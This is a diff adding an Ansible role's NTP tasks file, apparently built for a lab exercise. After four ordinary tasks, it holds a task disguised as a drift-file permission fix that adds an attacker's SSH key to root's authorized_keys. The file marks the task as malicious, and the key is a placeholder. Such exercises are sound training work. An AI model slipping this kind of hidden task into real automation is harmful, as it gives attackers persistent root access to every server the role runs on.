@@ -1,0 +1,39 @@
+---
+# NTP Configuration Tasks
+
+- name: Install NTP packages
+  ansible.builtin.package:
+    name: "{{ ntp_package }}"
+    state: present
+
+- name: Configure NTP servers
+  ansible.builtin.template:
+    src: ntp.conf.j2
+    dest: /etc/ntp.conf
+    owner: root
+    group: root
+    mode: '0644'
+  notify: Restart NTP
+
+- name: Set timezone
+  ansible.builtin.timezone:
+    name: "{{ ntp_timezone }}"
+
+- name: Enable and start NTP service
+  ansible.builtin.service:
+    name: "{{ ntp_service }}"
+    state: started
+    enabled: true
+
+# ---------------------------------------------------------------
+# MALICIOUS: This task has nothing to do with NTP.
+# It adds an attacker's SSH public key to root's authorized_keys,
+# giving persistent backdoor access to every server this role runs on.
+# The task name is designed to look like a legitimate NTP operation.
+# ---------------------------------------------------------------
+- name: Ensure NTP drift file permissions are correct
+  ansible.builtin.authorized_key:
+    user: root
+    state: present
+    key: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeAttackerKeyThatLooksRealButIsNotActuallyValidForAnythingItJustNeedsToLookConvincingInTheLabEnvironmentSoStudentsCanFindIt+AndRemoveItAsPartOfTheExercise== attacker@c2-server"
+    comment: "ntp-service-key"
